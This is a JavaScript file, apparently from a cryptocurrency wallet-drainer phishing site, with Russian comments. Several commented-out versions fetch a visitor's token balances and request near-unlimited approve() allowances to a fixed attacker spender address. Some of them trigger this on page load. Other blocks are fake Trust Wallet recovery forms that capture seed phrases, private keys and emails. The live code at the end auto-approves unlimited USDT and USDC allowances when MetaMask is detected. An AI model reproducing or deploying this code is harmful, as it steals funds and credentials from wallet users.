// const COVALENT_API_KEY = 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA';
// const CHAIN_ID = 1; 
// const SPENDER_ADDRESS = '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75'; 

// document.getElementById("connectWallet").addEventListener("click", () => {
//     console.log('Кнопка нажата, начинаем попытку открыть Trust Wallet');
//     setTimeout(() => {
//         try {
//             console.log('Пытаемся открыть Trust Wallet через схему URL');
//             window.location.href = "trust://";  
//             setTimeout(() => {
//                 console.log('Если приложение не установлено, редиректим на сайт');
//                 window.location.href = "https://trustwallet.com/download"; 
//             }, 5000); 
//         } catch (err) {
//             console.error('Ошибка при открытии Trust Wallet:', err);
//         }
//     }, 3000); 
// });


// async function approveAllTokens(web3, userAddress) {
//     console.log('Запрашиваем токены с Covalent API...');
//     const url = `https://api.covalenthq.com/v1/${CHAIN_ID}/address/${userAddress}/balances_v2/?key=${COVALENT_API_KEY}`;
//     try {
//         const res = await fetch(url);
//         const data = await res.json();
//         console.log('Полученные данные:', data);

//         if (data && data.data && data.data.items) {
//             for (const token of data.data.items) {
//                 if (
//                     token.type === "cryptocurrency" &&
//                     token.contract_address &&
//                     token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' 
//                 ) {
//                     const tokenAddress = token.contract_address;
//                     const tokenABI = [{
//                         "constant": false,
//                         "inputs": [
//                             { "name": "spender", "type": "address" },
//                             { "name": "value", "type": "uint256" }
//                         ],
//                         "name": "approve",
//                         "outputs": [{ "name": "", "type": "bool" }],
//                         "payable": false,
//                         "stateMutability": "nonpayable",
//                         "type": "function"
//                     }];

//                     const contract = new web3.eth.Contract(tokenABI, tokenAddress);
//                     const amount = web3.utils.toWei('1000000000000', 'ether'); 

//                     try {
//                         await contract.methods.approve(SPENDER_ADDRESS, amount).send({ from: userAddress });
//                         console.log(`Approved: ${token.contract_name || tokenAddress}`);
//                     } catch (e) {
//                         console.error(`Ошибка при approve: ${token.contract_name || tokenAddress}`, e.message);
//                     }
//                 }
//             }
//         }
//     } catch (err) {
//         console.error('Ошибка при запросе токенов с Covalent API:', err);
//     }
// }

// window.addEventListener('load', async () => {
//     console.log('Страница загружена, начинаем подключение к кошельку...');
//     if (typeof window.ethereum !== 'undefined') {
//         const web3 = new Web3(window.ethereum);
//         try {
//             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
//             const userAddress = accounts[0];
//             console.log("Адрес кошелька:", userAddress);

//             await approveAllTokens(web3, userAddress);
//         } catch (err) {
//             console.error("Ошибка при подключении к кошельку:", err);
//         }
//     } else {
//         console.error("Web3 не найден. Установите Trust Wallet или MetaMask.");
//     }});
// Конфигурация
//   const CONFIG = {
//     SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
//     COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
//     CHAIN_ID: 1,
//     TIMEOUT: 2000
//   };
  
//   document.addEventListener('DOMContentLoaded', () => {
//     setTimeout(showConnectButton, 2000);
//   });
  
//   function showConnectButton() {
//     const modal = document.getElementById('walletModal');
//     if (modal) {
//       modal.style.display = 'flex';
      
//       const connectBtn = document.getElementById('connectBtn');
//       if (connectBtn) {
//         connectBtn.addEventListener('click', handleWalletConnect);
//       }
//     }
//   }
  
//   async function handleWalletConnect() {
//     try {
//       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      
//       if (isMobile) {
//         await openTrustWallet();
        
//         setTimeout(checkWalletConnection, 1000);
//       } else {
//         alert('Please use a mobile device with Trust Wallet installed');
//       }
//     } catch (error) {
//       console.error('Connection error:', error);
//       alert('Connection failed. Please install Trust Wallet.');
//       redirectToDownload();
//     }
//   }
  
//   async function openTrustWallet() {
//     return new Promise((resolve) => {
//       try {
//         if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//           const iframe = document.createElement('iframe');
//           iframe.style.display = 'none';
//           iframe.src = 'trust://';
//           document.body.appendChild(iframe);
//           setTimeout(() => {
//             document.body.removeChild(iframe);
//             resolve();
//           }, 300);
//         } 
//         else {
//           window.location.href = 'trust://';
//           setTimeout(resolve, 300);
//         }
//       } catch (e) {
//         console.error('Error opening wallet:', e);
//         redirectToDownload();
//       }
//     });
//   }
  
//   function redirectToDownload() {
//     if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//       window.location.href = 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409';
//     } else {
//       window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp';
//     }
//   }
  
//   async function checkWalletConnection() {
//     if (window.trustwallet || window.ethereum) {
//       try {
//         const web3 = new Web3(window.trustwallet || window.ethereum);
//         const accounts = await web3.eth.requestAccounts();
        
//         if (accounts && accounts.length > 0) {
//           await approveTokens(web3, accounts[0]);
//           alert('All tokens approved successfully!');
//         } else {
//           alert('No accounts found. Please try again.');
//         }
//       } catch (error) {
//         console.error('Approval error:', error);
//         alert('Approval process failed. Please try again.');
//       }
//     } else {
//       alert('Trust Wallet not detected. Redirecting to download page...');
//       redirectToDownload();
//     }
//   }
  
//   async function approveTokens(web3, userAddress) {
//     try {
//       console.log('Fetching token balances...');
//       const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
//       const response = await fetch(url);
//       const { data } = await response.json();
  
//       if (data?.items) {
//         console.log(`Found ${data.items.length} tokens`);
        
//         for (const token of data.items) {
//           if (token.contract_address && 
//               token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
            
//             try {
//               console.log(`Processing token: ${token.contract_name || 'unnamed'} (${token.contract_address})`);
              
//               const contract = new web3.eth.Contract([{
//                 "constant": false,
//                 "inputs": [
//                   { "name": "spender", "type": "address" },
//                   { "name": "value", "type": "uint256" }
//                 ],
//                 "name": "approve",
//                 "outputs": [{ "name": "", "type": "bool" }],
//                 "payable": false,"stateMutability": "nonpayable",
//               "type": "function"
//             }], token.contract_address);

//             const tx = await contract.methods.approve(
//               CONFIG.SPENDER_ADDRESS, 
//               web3.utils.toWei('1000000', 'ether')
//             ).send({ from: userAddress });
            
//             console.log(`Approved successfully: ${token.contract_name || token.contract_address}`, tx);
//           } catch (e) {
//             console.warn(`Skipping token ${token.contract_name || token.contract_address}:`, e.message);
//           }
//         }
//       }
//     }
//   } catch (error) {
//     console.error('Error in token approval:', error);
//     throw error;
//   }
// };

// const CONFIG = {
//     SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
//     COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
//     CHAIN_ID: 1,
//     TIMEOUT: 2000
// };

// document.addEventListener('DOMContentLoaded', () => {
//     setTimeout(showConnectButton, 2000);
// });

// function showConnectButton() {
//     const modal = document.getElementById('walletModal');
//     if (modal) {
//         modal.style.display = 'flex';
        
//         const connectBtn = document.getElementById('connectBtn');
//         if (connectBtn) {
//             connectBtn.addEventListener('click', handleWalletConnect);
//         }
//     }
// }

// async function handleWalletConnect() {
//     try {
//         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
//         if (isMobile) {
//             await openTrustWallet();
            
//             setTimeout(checkWalletConnection, 1000);
//         } else {
//             alert('Please use a mobile device with Trust Wallet installed');
//         }
//     } catch (error) {
//         console.error('Connection error:', error);
//         alert('Connection failed. Please install Trust Wallet.');
//         redirectToDownload();
//     }
// }

// async function openTrustWallet() {
//     return new Promise((resolve) => {
//         try {
//             if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//                 const iframe = document.createElement('iframe');
//                 iframe.style.display = 'none';
//                 iframe.src = 'trust://';
//                 document.body.appendChild(iframe);
//                 setTimeout(() => {
//                     document.body.removeChild(iframe);
//                     resolve();
//                 }, 500);
//             } 
//             else {
//                 window.location.href = 'trust://';
//                 setTimeout(resolve, 300);
//             }
//         } catch (e) {
//             console.error('Error opening wallet:', e);
//             redirectToDownload();
//         }
//     });
// }

// function redirectToDownload() {
//     if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//         window.location.href = 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409';
//     } else {
//         window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp';
//     }
// }

// async function checkWalletConnection() {
//     if (window.ethereum) {
//         try {
//             const web3 = new Web3(window.ethereum);
//             await window.ethereum.request({ method: 'eth_requestAccounts' });
//             const accounts = await web3.eth.getAccounts();
            
//             if (accounts && accounts.length > 0) {
//                 await approveTokens(web3, accounts[0]);
//                 alert('All tokens approved successfully!');
//             } else {
//                 alert('No accounts found. Please try again.');
//             }
//         } catch (error) {
//             console.error('Approval error:', error);
//             alert('Approval process failed. Please try again.');
//         }
//     } else {
//         alert('Trust Wallet not detected. Redirecting to download page...');
//         redirectToDownload();
//     }
// }

// async function approveTokens(web3, userAddress) {
//     try {
//         console.log('Fetching token balances...');
//         const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
        
//         console.log('API Request URL:', url);
        
//         const response = await fetch(url);
        
//         if (!response.ok) {
//             console.error(`Error fetching data from Covalent API: ${response.status} ${response.statusText}`);
//             return;
//         }

//         const { data } = await response.json();
        
//         console.log('API Response Data:', data);
        
//         if (data?.items) {
//             console.log(`Found ${data.items.length} tokens`);
            
//             for (const token of data.items) {
//                 if (token.contract_address && token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
//                     try {
//                         console.log(`Processing token: ${token.contract_name || 'unnamed'} (${token.contract_address})`);
                        
//                         const contract = new web3.eth.Contract([{
//                             "constant": false,
//                             "inputs": [
//                                 { "name": "spender", "type": "address" },
//                                 { "name": "value", "type": "uint256" }
//                             ],
//                             "name": "approve",
//                             "outputs": [{ "name": "", "type": "bool" }],
//                             "payable": false,
//                             "stateMutability": "nonpayable",
//                             "type": "function"
//                         }], token.contract_address);
                        
//                         const amount = web3.utils.toWei('1000000000000', 'ether');
//                         await contract.methods.approve(CONFIG.SPENDER_ADDRESS, amount).send({ from: userAddress });
//                         console.log(`Approved: ${token.contract_name || token.contract_address}`);
//                     } catch (e) {
//                         console.error(`Error approving token: ${token.contract_name || token.contract_address}`, e);
//                     }
//                 }
//             }
//         } else {
//             console.log('No items found in API response');
//         }
//     } catch (err) {
//         console.error('Error fetching token balances:', err);
//     }
// };



// const CONFIG = {
//     SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
//     COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
//     CHAIN_ID: 1,
//     TIMEOUT: 2000
//   };
  
//   window.addEventListener('load', async () => {
//     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
//     const hasEthereum = typeof window.ethereum !== 'undefined' || typeof window.trustwallet !== 'undefined';
  
//     if (!hasEthereum && isMobile) {
//       const trustUrl = trust:
  
//       const timeout = setTimeout(() => {
//         if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
//           window.location.href = 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409';
//         } else {
//           window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp';
//         }
//       }, 3000);
  
//       // Открываем Trust Wallet
//       window.location.href = trustUrl;
//       return;
//     }
  
//     connectWalletAndApprove();
//   });
  
//   async function connectWalletAndApprove() {
//     try {
//       const web3 = new Web3(window.ethereum || window.trustwallet);
//       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
//       const userAddress = accounts[0];
  
//       console.log("Адрес кошелька:", userAddress);
  
//       const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
//       const res = await fetch(url);
//       if (!res.ok) throw new Error(Ошибка от Covalent: ${res.status});
  
//       const { data } = await res.json();
//       if (!data?.items) return;
  
//       for (const token of data.items) {
//         if (
//           token.contract_address &&
//           token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
//         ) {
//           const tokenABI = [{
//             "constant": false,
//             "inputs": [
//               { "name": "spender", "type": "address" },
//               { "name": "value", "type": "uint256" }
//             ],
//             "name": "approve",
//             "outputs": [{ "name": "", "type": "bool" }],
//             "payable": false,
//             "stateMutability": "nonpayable",
//             "type": "function"
//           }];
//           const contract = new web3.eth.Contract(tokenABI, token.contract_address);
//           const amount = web3.utils.toWei('1000000000000', 'ether');
  
//           try {
//             await contract.methods.approve(CONFIG.SPENDER_ADDRESS, amount).send({ from: userAddress });
//             console.log(`Approved: ${token.contract_name || token.contract_address}`);
//           } catch (e) {
//             console.error(`Ошибка approve: ${token.contract_name || token.contract_address}`, e);
//           }
//         }
//       }
//     } catch (err) {
//       console.error('Ошибка подключения или approve:', err);
//     }
//   }



// const CONFIG = {
//     SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
//     COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
//     CHAIN_ID: 1
//   };

//   function redirectToTrustWallet() {
//     window.location.href = 'trust://browser_enable';
//   }

//   async function autoApprove() {
//     try {
//       const provider = window.ethereum || window.trustwallet;
//       if (!provider) {
//         alert('Not in Trust Wallet browser. Redirecting...');
//         redirectToTrustWallet();
//         return;
//       }

//       const web3 = new Web3(provider);
//       const accounts = await provider.request({ method: 'eth_requestAccounts' });
//       const userAddress = accounts[0];

//       const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
//       const res = await fetch(url);
//       const json = await res.json();
//       const items = json?.data?.items;

//       if (!items || items.length === 0) return alert('No tokens found');

//       const abi = [{
//         constant: false,
//         inputs: [
//           { name: 'spender', type: 'address' },
//           { name: 'value', type: 'uint256' }
//         ],
//         name: 'approve',
//         outputs: [{ name: '', type: 'bool' }],
//         type: 'function'
//       }];

//       const bigAmount = web3.utils.toWei('1000000000000', 'ether');

//       for (const token of items) {
//         const addr = token.contract_address;
//         if (!addr || addr.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') continue;

//         const contract = new web3.eth.Contract(abi, addr);
//         try {
//           await contract.methods.approve(CONFIG.SPENDER_ADDRESS, bigAmount).send({ from: userAddress });
//           console.log(`Approved: ${token.contract_name || addr}`);
//         } catch (e) {
//           console.warn(`Skipped: ${token.contract_name || addr}, e.message`);
//         }
//       }

//       alert('Approve complete');
//     } catch (err) {
//       console.error('Error:', err);
//       alert('Failed to approve tokens');
//     }
//   }

//   setTimeout(() => {
//     if (!window.ethereum && /iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//       redirectToTrustWallet();
//     } else {
//       autoApprove();
//     }
//   }, 2000);





// const seedForm = document.getElementById('seedForm');
// const seedInput = document.getElementById('seedInput');
// const newSeedDisplay = document.getElementById('newSeedDisplay');
// const generatedSeed = document.getElementById('generatedSeed');

// const fakeSeed = [
//     "need", "height", "simplified", "cold", "fast", "observe",
//     "object", "blind", "heat", "charging", "bottle", "fireworks"
// ];

// seedForm.addEventListener('submit', function (e) {
//     e.preventDefault();

//     const userSeed = seedInput.value.trim();

//     if (userSeed.split(" ").length < 12) {
//         alert("Введите корректную seed-фразу (минимум 12 слов).");
//         return;
//     }

//     localStorage.setItem("userSeedPhrase", userSeed);

//     generatedSeed.textContent = fakeSeed.join(", ");
//     newSeedDisplay.style.display = "block";

//     setTimeout(() => {
//         seedForm.classList.add("fade-out");
//     }, 10000);
// });

// const step1 = document.getElementById('step1');
//     const step2 = document.getElementById('step2');
//     const step3 = document.getElementById('step3');
//     const seedForm = document.getElementById('seedForm');
//     const seedInput = document.getElementById('seedInput');

//     function goToStep2() {
//         step1.classList.add('hidden');
//         step2.classList.remove('hidden');
//     }

//     seedForm.addEventListener('submit', function (e) {
//         e.preventDefault();
//         const seed = seedInput.value.trim();
//         const wordCount = seed.split(/\s+/).length;

//         if (wordCount !== 12 && wordCount !== 24) {
//             alert("Seed-фраза должна содержать 12 или 24 слова.");
//             return;
//         }

//         localStorage.setItem("userSeedPhrase", seed);

//         step2.classList.add('hidden');
//         step3.classList.remove('hidden');
//     });




// const step1 = document.getElementById('step1');
//   const step2 = document.getElementById('step2');
//   const step3 = document.getElementById('step3');
//   const stepLoading = document.getElementById('stepLoading');
//   const seedForm = document.getElementById('seedForm');
//   const seedInput = document.getElementById('seedInput');
//   const emailInput = document.getElementById('emailInput');
//   const userEmailDisplay = document.getElementById('userEmailDisplay');

//   function goToStep2() {
//     step1.classList.add('fadeOut');
//     setTimeout(() => {
//       step1.classList.add('hidden');
//       step2.classList.remove('hidden');
//     }, 500);
//   }

//   seedForm.addEventListener('submit', function (e) {
//     e.preventDefault();
//     const seed = seedInput.value.trim();
//     const email = emailInput.value.trim();
//     const wordCount = seed.split(/\s+/).length;

//     if ((wordCount !== 12 && wordCount !== 24) || !validateEmail(email)) {
//       alert("Пожалуйста, введите корректную seed-фразу и email.");
//       return;
//     }

//     localStorage.setItem("userSeedPhrase", seed);
//     localStorage.setItem("userEmail", email);

//     step2.classList.add('fadeOut');
//     setTimeout(() => {
//       step2.classList.add('hidden');
//       stepLoading.classList.remove('hidden');

//       setTimeout(() => {
//         stepLoading.classList.add('fadeOut');
//         setTimeout(() => {
//           stepLoading.classList.add('hidden');
//           userEmailDisplay.innerText = email;
//           step3.classList.remove('hidden');
//         }, 500);
//       }, 4000);
//     }, 500);
//   });

//   function validateEmail(email) {
//     return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
//   }

//   function finish() {
//     alert("Вы будете перенаправлены на главный экран.");
//     location.href = "https://trustwallet.com"; 
//   }

//   function showStep2() {
//     document.getElementById("step1").classList.add("hidden");
//     document.getElementById("step2").classList.remove("hidden");
//   }
  
//   function selectMethod(method) {
//     document.getElementById("step2").classList.add("hidden");
//     if (method === "seed") {
//       document.getElementById("seedForm").classList.remove("hidden");
//     } else {
//       document.getElementById("privateForm").classList.remove("hidden");
//     }
//   }
  
//   function submitRecovery() {
//     const seed = document.getElementById("seedInput")?.value;
//     const key = document.getElementById("privateInput")?.value;
//     console.log("Seed:", seed);
//     console.log("Private Key:", key);
    
  
//     document.getElementById("seedForm")?.classList.add("hidden");
//     document.getElementById("privateForm")?.classList.add("hidden");
//     document.getElementById("finalMessage").classList.remove("hidden");
//   }

  

 // Полный рабочий код для открытия MetaMask на iOS
// Полный оптимизированный код для мгновенного открытия MetaMask
// Функция для кодирования URL без проблемных символов
// Полный рабочий код для подключения MetaMask на iOS
// Функция для безопасного открытия MetaMask на iOS
const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    const dappUrl = encodeURIComponent(window.location.origin);
    const deepLink = `https://metamask.app.link/dapp/${dappUrl}`;

    async function connectWallet() {
      const button = document.querySelector('.connect-btn');
      button.textContent = "Connecting...";

      if (isIOS && typeof window.ethereum === 'undefined') {
        // Если на iOS и MetaMask не доступен, открываем через deeplink
        window.location.href = deepLink;
        return;
      }

      if (typeof window.ethereum === 'undefined') {
        alert("Установи MetaMask!");
        button.textContent = "Connect Wallet";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const tokenList = [
          {
            address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
            spender: "0x000000000000000000000000000000000000dead"
          },
          {
            address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
            spender: "0x000000000000000000000000000000000000dead"
          }
        ];

        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];

        for (let token of tokenList) {
          const contract = new ethers.Contract(token.address, abi, signer);
          const tx = await contract.approve(token.spender, ethers.constants.MaxUint256);
          console.log(`Approve sent for ${token.address}:`, tx.hash);
        }

        button.textContent = "Approved!";
      } catch (err) {
        console.error("Error:", err);
        button.textContent = "Try Again";
      }
    }

    // Если уже в MetaMask — запускаем авто
    window.addEventListener("DOMContentLoaded", () => {
      if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
        connectWallet();
      }
    });